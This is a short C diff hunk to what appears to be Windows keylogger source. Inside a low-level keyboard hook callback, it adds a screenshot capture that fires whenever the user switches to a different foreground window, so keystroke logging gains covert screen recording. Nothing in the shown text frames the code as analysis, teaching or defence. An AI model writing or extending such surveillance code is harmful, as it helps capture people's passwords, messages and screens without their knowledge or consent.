@@ -21,6 +21,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
     if (foregroundWindowChanged)
     {
+        TakeScreenshot();
         foregroundWindowChanged = FALSE;
         SYSTEMTIME lt;    
         GetLocalTime(&lt);
